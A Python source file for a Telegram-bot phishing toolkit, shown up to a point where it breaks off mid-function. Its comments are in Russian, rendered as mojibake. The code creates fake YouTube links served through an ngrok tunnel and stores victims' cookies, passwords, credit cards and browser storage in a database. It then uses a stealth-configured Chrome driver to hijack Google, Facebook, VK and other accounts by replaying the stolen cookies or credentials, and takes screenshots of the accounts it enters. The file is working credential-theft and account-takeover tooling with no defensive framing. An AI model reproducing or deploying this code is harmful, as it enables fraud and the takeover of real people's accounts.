import logging
import asyncio
import json
import re
import uuid
import os
import time
import sys
import sqlite3
import random
import string
from datetime import datetime
from typing import Dict, List, Optional, Any
import threading
import subprocess
from urllib.parse import urlparse, parse_qs, quote, unquote
import html
import base64

# Selenium –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –≤—Ö–æ–¥–∞
import undetected_chromedriver as uc
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException, WebDriverException

# Flask –∏ –≤–µ–±
from flask import Flask, request, jsonify, render_template_string, make_response, redirect, send_file
from flask_cors import CORS
import requests
from werkzeug.middleware.proxy_fix import ProxyFix

# Pyngrok –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è ngrok
from pyngrok import ngrok, conf

# Telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)
from telegram.constants import ParseMode

# ========== –ù–ê–°–¢–†–û–ô–ö–ò ==========
# –ó–ê–ú–ï–ù–ò–¢–ï –≠–¢–ò –¢–û–ö–ï–ù–´ –ù–ê –°–í–û–ò!
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # –ü–æ–ª—É—á–∏—Ç–µ —É @BotFather
NGROK_AUTH_TOKEN = "YOUR_NGROK_TOKEN_HERE"  # –ü–æ–ª—É—á–∏—Ç–µ –Ω–∞ ngrok.com
ADMIN_ID = 1234567890  # –í–∞—à Telegram ID (–º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å —É @userinfobot)
FLASK_PORT = 8080

# –ï—Å–ª–∏ –Ω–µ—Ç —Ç–æ–∫–µ–Ω–∞ ngrok, –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–µ—Å–ø–ª–∞—Ç–Ω—ã–π (–Ω–æ —Å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è–º–∏)
USE_PYNGROK = True  # –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å pyngrok –≤–º–µ—Å—Ç–æ —Ä—É—á–Ω–æ–≥–æ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è

# –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –≤—Ö–æ–¥–∞
AUTO_LOGIN_CONFIG = {
    "device_name": "Windows 10 Chrome",
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "screen_size": {"width": 1920, "height": 1080},
    "language": "ru-RU",
    "timezone": "Europe/Moscow",
    "location": {
        "ip": "31.43.37.220",
        "city": "Moscow",
        "country": "Russia"
    }
}

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler('youtube_phishing.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ========== –ë–ê–ó–ê –î–ê–ù–ù–´–• ==========
class Database:
    def __init__(self):
        self.conn = sqlite3.connect('youtube_phishing.db', check_same_thread=False)
        self.create_tables()
    
    def create_tables(self):
        cursor = self.conn.cursor()
        
        # –¢–∞–±–ª–∏—Ü–∞ —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–æ–∫
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                youtube_url TEXT,
                youtube_id TEXT,
                phishing_url TEXT,
                created_at TEXT,
                created_by INTEGER,
                clicks INTEGER DEFAULT 0,
                is_active INTEGER DEFAULT 1,
                title TEXT,
                description TEXT
            )
        ''')
        
        # –¢–∞–±–ª–∏—Ü–∞ —Å–æ–±—Ä–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS captured_data (
                id TEXT PRIMARY KEY,
                link_id TEXT,
                timestamp TEXT,
                ip_address TEXT,
                user_agent TEXT,
                cookies TEXT,
                localStorage TEXT,
                sessionStorage TEXT,
                passwords TEXT,
                logins TEXT,
                credit_cards TEXT,
                autofill_data TEXT,
                browser_info TEXT,
                device_info TEXT,
                network_info TEXT,
                sensitive_data TEXT,
                identified_services TEXT,
                FOREIGN KEY (link_id) REFERENCES phishing_links (id)
            )
        ''')
        
        # –¢–∞–±–ª–∏—Ü–∞ —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –∞–≤—Ç–æ–≤—Ö–æ–¥–∞
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS auto_login_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                data_id TEXT,
                service TEXT,
                email TEXT,
                password TEXT,
                cookies TEXT,
                tokens TEXT,
                login_result TEXT,
                screenshot_path TEXT,
                timestamp TEXT,
                FOREIGN KEY (data_id) REFERENCES captured_data (id)
            )
        ''')
        
        # –¢–∞–±–ª–∏—Ü–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –∞–≤—Ç–æ–≤—Ö–æ–¥–∞
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS auto_login_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                data_id TEXT,
                service TEXT,
                success INTEGER,
                message TEXT,
                account_info TEXT,
                screenshot_path TEXT,
                timestamp TEXT
            )
        ''')
        
        # –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS stats (
                key TEXT PRIMARY KEY,
                value INTEGER
            )
        ''')
        
        # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        default_stats = [
            ('total_links', 0),
            ('total_clicks', 0),
            ('total_captured', 0),
            ('total_credentials', 0),
            ('total_cookies', 0),
            ('auto_login_attempts', 0),
            ('auto_login_success', 0),
            ('google_accounts', 0),
            ('facebook_accounts', 0),
            ('instagram_accounts', 0),
            ('twitter_accounts', 0),
            ('vk_accounts', 0)
        ]
        
        cursor.executemany(
            'INSERT OR IGNORE INTO stats (key, value) VALUES (?, ?)',
            default_stats
        )
        
        self.conn.commit()
    
    # –ú–µ—Ç–æ–¥—ã –¥–ª—è —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–æ–∫
    def add_phishing_link(self, link_data):
        cursor = self.conn.cursor()
        
        cursor.execute('''
            INSERT INTO phishing_links 
            (id, youtube_url, youtube_id, phishing_url, created_at, created_by, title, description)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            link_data['id'],
            link_data['youtube_url'],
            link_data['youtube_id'],
            link_data['phishing_url'],
            link_data['created_at'],
            link_data['created_by'],
            link_data.get('title', ''),
            link_data.get('description', '')
        ))
        
        cursor.execute('UPDATE stats SET value = value + 1 WHERE key = "total_links"')
        self.conn.commit()
        return True
    
    def increment_clicks(self, link_id):
        cursor = self.conn.cursor()
        cursor.execute('UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?', (link_id,))
        cursor.execute('UPDATE stats SET value = value + 1 WHERE key = "total_clicks"')
        self.conn.commit()
    
    def get_link(self, link_id):
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM phishing_links WHERE id = ?', (link_id,))
        row = cursor.fetchone()
        
        if not row:
            return None
        
        columns = [desc[0] for desc in cursor.description]
        return dict(zip(columns, row))
    
    def get_user_links(self, user_id):
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM phishing_links WHERE created_by = ? ORDER BY created_at DESC', (user_id,))
        
        columns = [desc[0] for desc in cursor.description]
        return [dict(zip(columns, row)) for row in cursor.fetchall()]
    
    # –ú–µ—Ç–æ–¥—ã –¥–ª—è —Å–æ–±—Ä–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
    def add_captured_data(self, data):
        cursor = self.conn.cursor()
        
        cursor.execute('''
            INSERT INTO captured_data 
            (id, link_id, timestamp, ip_address, user_agent, cookies, localStorage, 
             sessionStorage, passwords, logins, credit_cards, autofill_data, 
             browser_info, device_info, network_info, sensitive_data, identified_services)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            data['id'],
            data['link_id'],
            data['timestamp'],
            data.get('ip_address'),
            data.get('user_agent'),
            json.dumps(data.get('cookies', []), ensure_ascii=False),
            json.dumps(data.get('localStorage', {}), ensure_ascii=False),
            json.dumps(data.get('sessionStorage', {}), ensure_ascii=False),
            json.dumps(data.get('passwords', []), ensure_ascii=False),
            json.dumps(data.get('logins', []), ensure_ascii=False),
            json.dumps(data.get('credit_cards', []), ensure_ascii=False),
            json.dumps(data.get('autofill_data', {}), ensure_ascii=False),
            json.dumps(data.get('browser_info', {}), ensure_ascii=False),
            json.dumps(data.get('device_info', {}), ensure_ascii=False),
            json.dumps(data.get('network_info', {}), ensure_ascii=False),
            json.dumps(data.get('sensitive_data', {}), ensure_ascii=False),
            json.dumps(data.get('identified_services', []), ensure_ascii=False)
        ))
        
        # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
        cursor.execute('UPDATE stats SET value = value + 1 WHERE key = "total_captured"')
        
        credentials_count = len(data.get('passwords', [])) + len(data.get('logins', []))
        if credentials_count > 0:
            cursor.execute('UPDATE stats SET value = value + ? WHERE key = "total_credentials"', (credentials_count,))
        
        cookies_count = len(data.get('cookies', []))
        if cookies_count > 0:
            cursor.execute('UPDATE stats SET value = value + ? WHERE key = "total_cookies"', (cookies_count,))
        
        self.conn.commit()
        return True
    
    def get_captured_data(self, data_id):
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM captured_data WHERE id = ?', (data_id,))
        row = cursor.fetchone()
        
        if not row:
            return None
        
        columns = [desc[0] for desc in cursor.description]
        data = dict(zip(columns, row))
        
        # –ü–∞—Ä—Å–∏–º JSON –ø–æ–ª—è
        json_fields = ['cookies', 'localStorage', 'sessionStorage', 'passwords', 'logins',
                      'credit_cards', 'autofill_data', 'browser_info', 'device_info',
                      'network_info', 'sensitive_data', 'identified_services']
        
        for field in json_fields:
            if data.get(field):
                try:
                    data[field] = json.loads(data[field])
                except:
                    data[field] = []
        
        return data
    
    def get_data_by_link(self, link_id):
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM captured_data WHERE link_id = ? ORDER BY timestamp DESC', (link_id,))
        
        columns = [desc[0] for desc in cursor.description]
        results = []
        
        for row in cursor.fetchall():
            data = dict(zip(columns, row))
            
            # –ü–∞—Ä—Å–∏–º JSON –ø–æ–ª—è
            json_fields = ['cookies', 'passwords', 'logins', 'identified_services']
            for field in json_fields:
                if data.get(field):
                    try:
                        data[field] = json.loads(data[field])
                    except:
                        data[field] = []
            
            results.append(data)
        
        return results
    
    # –ú–µ—Ç–æ–¥—ã –¥–ª—è –∞–≤—Ç–æ–≤—Ö–æ–¥–∞
    def add_auto_login_result(self, result_data):
        cursor = self.conn.cursor()
        
        cursor.execute('''
            INSERT INTO auto_login_results 
            (data_id, service, success, message, account_info, screenshot_path, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (
            result_data['data_id'],
            result_data['service'],
            result_data['success'],
            result_data['message'],
            json.dumps(result_data.get('account_info', {}), ensure_ascii=False),
            result_data.get('screenshot_path'),
            result_data['timestamp']
        ))
        
        # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
        cursor.execute('UPDATE stats SET value = value + 1 WHERE key = "auto_login_attempts"')
        if result_data['success']:
            cursor.execute('UPDATE stats SET value = value + 1 WHERE key = "auto_login_success"')
        
        # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –ø–æ —Å–µ—Ä–≤–∏—Å–∞–º
        if result_data['success']:
            cursor.execute(
                'UPDATE stats SET value = value + 1 WHERE key = ?',
                (f"{result_data['service']}_accounts",)
            )
        
        self.conn.commit()
        return True
    
    def get_auto_login_results(self, data_id=None):
        cursor = self.conn.cursor()
        
        if data_id:
            cursor.execute('SELECT * FROM auto_login_results WHERE data_id = ? ORDER BY timestamp DESC', (data_id,))
        else:
            cursor.execute('SELECT * FROM auto_login_results ORDER BY timestamp DESC LIMIT 50')
        
        columns = [desc[0] for desc in cursor.description]
        results = []
        
        for row in cursor.fetchall():
            data = dict(zip(columns, row))
            if data.get('account_info'):
                try:
                    data['account_info'] = json.loads(data['account_info'])
                except:
                    data['account_info'] = {}
            results.append(data)
        
        return results
    
    # –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞
    def get_stats(self):
        cursor = self.conn.cursor()
        cursor.execute('SELECT key, value FROM stats')
        rows = cursor.fetchall()
        return {row[0]: row[1] for row in rows}
    
    def get_service_stats(self):
        cursor = self.conn.cursor()
        cursor.execute('''
            SELECT service, COUNT(*) as count, 
                   SUM(CASE WHEN success = 1 THEN 1 ELSE 0 END) as success_count
            FROM auto_login_results 
            GROUP BY service
        ''')
        
        stats = {}
        for row in cursor.fetchall():
            stats[row[0]] = {
                'total': row[1],
                'success': row[2],
                'success_rate': round((row[2] / row[1]) * 100, 1) if row[1] > 0 else 0
            }
        
        return stats

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–∞–∑—ã
db = Database()

# ========== NGROK –ú–ï–ù–ï–î–ñ–ï–† ==========
class NgrokManager:
    def __init__(self, auth_token):
        self.auth_token = auth_token
        self.public_url = None
        self.tunnel = None
        
        # –ù–∞—Å—Ç—Ä–æ–π–∫–∞ pyngrok
        conf.get_default().auth_token = auth_token
        
    def start(self, port=8080):
        """–ó–∞–ø—É—Å–∫–∞–µ—Ç ngrok —Ç—É–Ω–Ω–µ–ª—å —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º pyngrok"""
        try:
            logger.info(f"Starting ngrok tunnel on port {port}")
            
            # –ó–∞–∫—Ä—ã–≤–∞–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–µ —Ç—É–Ω–Ω–µ–ª–∏
            self.stop()
            
            # –°–æ–∑–¥–∞–µ–º —Ç—É–Ω–Ω–µ–ª—å
            self.tunnel = ngrok.connect(port, "http")
            self.public_url = self.tunnel.public_url
            
            logger.info(f"‚úÖ Ngrok started! Public URL: {self.public_url}")
            logger.info(f"Dashboard: http://127.0.0.1:4040")
            
            return self.public_url
            
        except Exception as e:
            logger.error(f"‚ùå Error starting ngrok: {e}")
            
            # –ü—Ä–æ–±—É–µ–º –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π —Å–ø–æ—Å–æ–±
            try:
                logger.info("Trying alternative method...")
                self.tunnel = ngrok.connect(addr=port, proto="http", bind_tls=True)
                self.public_url = self.tunnel.public_url
                logger.info(f"‚úÖ Ngrok started (alternative)! URL: {self.public_url}")
                return self.public_url
            except Exception as e2:
                logger.error(f"‚ùå Alternative method also failed: {e2}")
                return None
    
    def get_public_url(self):
        """–ü–æ–ª—É—á–∞–µ—Ç –ø—É–±–ª–∏—á–Ω—ã–π URL –æ—Ç ngrok"""
        return self.public_url
    
    def stop(self):
        """–û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç ngrok —Ç—É–Ω–Ω–µ–ª—å"""
        try:
            if self.tunnel:
                ngrok.disconnect(self.tunnel.public_url)
                logger.info("Ngrok tunnel stopped")
            self.tunnel = None
            self.public_url = None
        except Exception as e:
            logger.error(f"Error stopping ngrok: {e}")
    
    def get_tunnels(self):
        """–ü–æ–ª—É—á–∞–µ—Ç —Å–ø–∏—Å–æ–∫ –∞–∫—Ç–∏–≤–Ω—ã—Ö —Ç—É–Ω–Ω–µ–ª–µ–π"""
        try:
            tunnels = ngrok.get_tunnels()
            return tunnels
        except:
            return []

# ========== –ú–ï–ù–ï–î–ñ–ï–† –ê–í–¢–û–í–•–û–î–ê ==========
class AutoLoginManager:
    def __init__(self):
        self.driver = None
        self.results = []
    
    def setup_driver(self):
        """–ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ—Ç ChromeDriver –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –≤—Ö–æ–¥–∞"""
        try:
            chrome_options = Options()
            
            # –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –¥–ª—è –æ–±—Ö–æ–¥–∞ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è
            chrome_options.add_argument(f'--user-agent={AUTO_LOGIN_CONFIG["user_agent"]}')
            chrome_options.add_argument(f'--window-size={AUTO_LOGIN_CONFIG["screen_size"]["width"]},{AUTO_LOGIN_CONFIG["screen_size"]["height"]}')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            chrome_options.add_argument(f'--lang={AUTO_LOGIN_CONFIG["language"]}')
            
            # –ó–∞–ø—É—Å–∫ –≤ headless —Ä–µ–∂–∏–º–µ (–±–µ–∑ –≥—Ä–∞—Ñ–∏—á–µ—Å–∫–æ–≥–æ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞)
            # chrome_options.add_argument('--headless')
            
            self.driver = uc.Chrome(options=chrome_options)
            
            # –°–∫—Ä—ã–≤–∞–µ–º WebDriver
            self.driver.execute_cdp_cmd('Network.setUserAgentOverride', {
                "userAgent": AUTO_LOGIN_CONFIG["user_agent"],
                "platform": "Windows",
                "acceptLanguage": AUTO_LOGIN_CONFIG["language"]
            })
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            logger.info("ChromeDriver –Ω–∞—Å—Ç—Ä–æ–µ–Ω –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –≤—Ö–æ–¥–∞")
            return True
            
        except Exception as e:
            logger.error(f"Error setting up ChromeDriver: {e}")
            return False
    
    def login_with_cookies(self, service, cookies, email=None, password=None):
        """–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –≤—Ö–æ–¥ —á–µ—Ä–µ–∑ cookies"""
        try:
            if not self.driver:
                if not self.setup_driver():
                    return {"success": False, "message": "–ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å –±—Ä–∞—É–∑–µ—Ä"}
            
            service_urls = {
                "google": "https://accounts.google.com",
                "facebook": "https://facebook.com",
                "instagram": "https://instagram.com",
                "twitter": "https://twitter.com",
                "vk": "https://vk.com",
                "yandex": "https://passport.yandex.ru",
                "mailru": "https://mail.ru",
                "github": "https://github.com",
                "microsoft": "https://login.live.com"
            }
            
            if service not in service_urls:
                return {"success": False, "message": f"–°–µ—Ä–≤–∏—Å {service} –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è"}
            
            url = service_urls[service]
            self.driver.get(url)
            time.sleep(2)
            
            # –û—á–∏—â–∞–µ–º cookies
            self.driver.delete_all_cookies()
            
            # –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—ã–µ cookies
            for cookie in cookies:
                try:
                    if isinstance(cookie, dict) and 'name' in cookie and 'value' in cookie:
                        selenium_cookie = {
                            'name': cookie['name'],
                            'value': cookie['value'],
                            'domain': cookie.get('domain', '.google.com' if service == 'google' else f'.{service}.com'),
                            'path': cookie.get('path', '/'),
                            'secure': True if url.startswith('https://') else False
                        }
                        self.driver.add_cookie(selenium_cookie)
                except Exception as e:
                    logger.error(f"Error adding cookie: {e}")
            
            # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç—Ä–∞–Ω–∏—Ü—É
            self.driver.refresh()
            time.sleep(3)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —É—Å–ø–µ—à–Ω–æ—Å—Ç—å –≤—Ö–æ–¥–∞
            is_logged_in = self.check_login_status(service)
            
            if is_logged_in:
                # –î–µ–ª–∞–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç
                screenshot_dir = "screenshots"
                os.makedirs(screenshot_dir, exist_ok=True)
                screenshot_path = f"{screenshot_dir}/{service}_{int(time.time())}.png"
                self.driver.save_screenshot(screenshot_path)
                
                # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± –∞–∫–∫–∞—É–Ω—Ç–µ
                account_info = self.get_account_info(service)
                
                return {
                    "success": True,
                    "service": service,
                    "message": "–£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥",
                    "account_info": account_info,
                    "screenshot_path": screenshot_path,
                    "url": self.driver.current_url
                }
            else:
                # –ü—Ä–æ–±—É–µ–º –≤–æ–π—Ç–∏ —á–µ—Ä–µ–∑ email/password –µ—Å–ª–∏ –µ—Å—Ç—å
                if email and password:
                    return self.login_with_credentials(service, email, password)
                
                return {
                    "success": False,
                    "service": service,
                    "message": "–ù–µ —É–¥–∞–ª–æ—Å—å –≤–æ–π—Ç–∏ —á–µ—Ä–µ–∑ cookies"
                }
            
        except Exception as e:
            logger.error(f"Error in auto login for {service}: {e}")
            return {
                "success": False,
                "service": service,
                "message": f"–û—à–∏–±–∫–∞: {str(e)[:100]}"
            }
    
    def check_login_status(self, service):
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç —Å—Ç–∞—Ç—É—Å –≤—Ö–æ–¥–∞"""
        try:
            time.sleep(2)
            
            check_selectors = {
                "google": ['[aria-label*="–ê–∫–∫–∞—É–Ω—Ç"]', '[data-identifier*="@"]'],
                "facebook": ['[aria-label="–í–∞—à –ø—Ä–æ—Ñ–∏–ª—å"]', '[data-testid="left_nav_item_Profile"]'],
                "instagram": ['[href*="/accounts/"]', 'img[alt*="profile"]'],
                "twitter": ['[data-testid="SideNav_AccountSwitcher_Button"]', '[aria-label="–ü—Ä–æ—Ñ–∏–ª—å"]'],
                "vk": ['#top_profile_link', '.top_profile_name'],
                "yandex": ['.passport-User-Avatar', '.passport-Header-Text']
            }
            
            if service in check_selectors:
                for selector in check_selectors[service]:
                    try:
                        elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                        if elements:
                            return True
                    except:
                        continue
            
            # –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ URL
            current_url = self.driver.current_url
            logged_in_urls = {
                "google": ["myaccount.google.com", "mail.google.com"],
                "facebook": ["facebook.com/home"],
                "instagram": ["instagram.com/direct/"],
                "twitter": ["twitter.com/home"],
                "vk": ["vk.com/feed"],
                "yandex": ["passport.yandex.ru/profile"]
            }
            
            if service in logged_in_urls:
                for logged_url in logged_in_urls[service]:
                    if logged_url in current_url:
                        return True
            
            return False
            
        except:
            return False
    
    def get_account_info(self, service):
        """–ü–æ–ª—É—á–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± –∞–∫–∫–∞—É–Ω—Ç–µ"""
        info = {"service": service, "url": self.driver.current_url}
        
        try:
            if service == "google":
                self.driver.get("https://myaccount.google.com")
                time.sleep(2)
                
                # –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å email
                email_elements = self.driver.find_elements(By.CSS_SELECTOR, '[data-identifier], [data-email]')
                if email_elements:
                    info["email"] = email_elements[0].get_attribute("data-identifier") or \
                                  email_elements[0].get_attribute("data-email") or \
                                  email_elements[0].text
            
            elif service == "facebook":
                # –ü–µ—Ä–µ—Ö–æ–¥–∏–º –≤ –ø—Ä–æ—Ñ–∏–ª—å
                profile_links = self.driver.find_elements(By.CSS_SELECTOR, '[data-testid="left_nav_item_Profile"]')
                if profile_links:
                    profile_links[0].click()
                    time.sleep(2)
                
                # –ü–æ–ª—É—á–∞–µ–º –∏–º—è
                name_elements = self.driver.find_elements(By.CSS_SELECTOR, 'h1, .gmql0nx0')
                if name_elements:
                    info["name"] = name_elements[0].text
            
            elif service == "vk":
                # –ü–æ–ª—É—á–∞–µ–º ID –∏–∑ URL
                if "/id" in self.driver.current_url:
                    parts = self.driver.current_url.split("/id")
                    if len(parts) > 1:
                        info["vk_id"] = parts[1].split("/")[0]
            
        except:
            pass
        
        return info
    
    def login_with_credentials(self, service, email, password):
        """–í—Ö–æ–¥ —á–µ—Ä–µ–∑ email –∏ –ø–∞—Ä–æ–ª—å"""
        try:
            service_urls = {
                "google": "https://accounts.google.com",
                "facebook": "https://facebook.com",
                "vk": "https://vk.com"
            }
            
            if service not in service_urls:
                return {"success": False, "message": "–°–µ—Ä–≤–∏—Å –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –≤—Ö–æ–¥ –ø–æ –ø–∞—Ä–æ–ª—é"}
            
            self.driver.get(service_urls[service])
            time.sleep(2)
            
            # Google
            if service == "google":
                # –í–≤–æ–¥–∏–º email
                email_field = self.driver.find_element(By.CSS_SELECTOR, 'input[type="email"]')
                email_field.send_keys(email)
                self.driver.find_element(By.ID, 'identifierNext').click()
                time.sleep(2)
                
                # –í–≤–æ–¥–∏–º –ø–∞—Ä–æ–ª—å
                password_field = self.driver.find_element(By.CSS_SELECTOR, 'input[type="password"]')
                password_field.send_keys(password)
                self.driver.find_element(By.ID, 'passwordNext').click()
                time.sleep(3)
            
            # Facebook
            elif service == "facebook":
                email_field = self.driver.find_element(By.ID, 'email')
                password_field = self.driver.find_element(By.ID, 'pass')
                email_field.send_keys(email)
                password_field.send_keys(password)
                self.driver.find_element(By.NAME, 'login').click()
                time.sleep(3)
            
            # VK
            elif service == "vk":
                email_field = self.driver.find_element(By.NAME, 'email')
                password_field = self.driver.find_element(By.NAME, 'pass')
                email_field.send_keys(email)
                password_field.send_keys(password)
                self.driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]').click()
                time.sleep(3)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —É—Å–ø–µ—à–Ω–æ—Å—Ç—å
            if self.check_login_status(service):
                screenshot_path = f"screenshots/{service}_{int(time.time())}.png"
                self.driver.save_screenshot(screenshot_path)
                
                return {
                    "success": True,
                    "service": service,
                    "message": "–£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥ —á–µ—Ä–µ–∑ –ø–∞—Ä–æ–ª—å",
                    "screenshot_path": screenshot_path
                }
            else:
                return {
                    "success": False,
                    "service": service,
                    "message": "–ù–µ–≤–µ—Ä–Ω—ã–π –ª–æ–≥–∏–Ω –∏–ª–∏ –ø–∞—Ä–æ–ª—å"
                }
            
        except Exception as e:
            logger.error(f"Error in credentials login: {e}")
            return {
                "success": False,
                "service": service,
                "message": f"–û—à–∏–±–∫–∞: {str(e)[:100]}"
            }
    
    def auto_login_all_services(self, captured_data):
        """–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –≤—Ö–æ–¥–∏—Ç –≤–æ –≤—Å–µ –≤–æ–∑–º–æ–∂–Ω—ã–µ —Å–µ—Ä–≤–∏—Å—ã"""
        results = []
        
        # –ü–æ–ª—É—á–∞–µ–º cookies –∏–∑ –¥–∞–Ω–Ω—ã—Ö
        cookies = captured_data.get('cookies', [])
        passwords = captured_data.get('passwords', [])
        logins = captured_data.get('logins', [])
        
        if not cookies and not passwords:
            logger.info("No credentials for auto login")
            return results
        
        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º –∫–∞–∫–∏–µ —Å–µ—Ä–≤–∏—Å—ã –≤–æ–∑–º–æ–∂–Ω—ã
        services_to_try = self.identify_services_from_data(captured_data)
        
        logger.info(f"Trying auto login for services: {services_to_try}")
        
        for service in services_to_try:
            logger.info(f"–ü–æ–ø—ã—Ç–∫–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –≤—Ö–æ–¥–∞ –≤ {service}")
            
            # –ò—â–µ–º email –∏ –ø–∞—Ä–æ–ª—å –¥–ª—è —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–∏—Å–∞
            email, password = self.find_credentials_for_service(service, logins, passwords)
            
            # –ü—Ä–æ–±—É–µ–º –≤–æ–π—Ç–∏ —á–µ—Ä–µ–∑ cookies
            result = self.login_with_cookies(service, cookies, email, password)
            results.append(result)
            
            # –ü–∞—É–∑–∞ –º–µ–∂–¥—É –ø–æ–ø—ã—Ç–∫–∞–º–∏
            time.sleep(2)
        
        return results
    
    def identify_services_from_data(self, data):
        """–û–ø—Ä–µ–¥–µ–ª—è–µ—Ç –≤–æ–∑–º–æ–∂–Ω—ã–µ —Å–µ—Ä–≤–∏—Å—ã –∏–∑ –¥–∞–Ω–Ω—ã—Ö"""
        services = set()
        
        # –ò–∑ cookies
        cookies = data.get('cookies', [])
        for cookie in cookies:
            cookie_name = cookie.get('name', '').lower()
            cookie_value = cookie.get('value', '').lower()
            
            if 'google' in cookie_name or 'google' in cookie_value:
                services.add('google')
            if 'facebook' in cookie_name or 'fb' in cookie_name:
                services.add('facebook')
            if 'instagram' in cookie_name or 'ig_' in cookie_name:
                services.add('instagram')
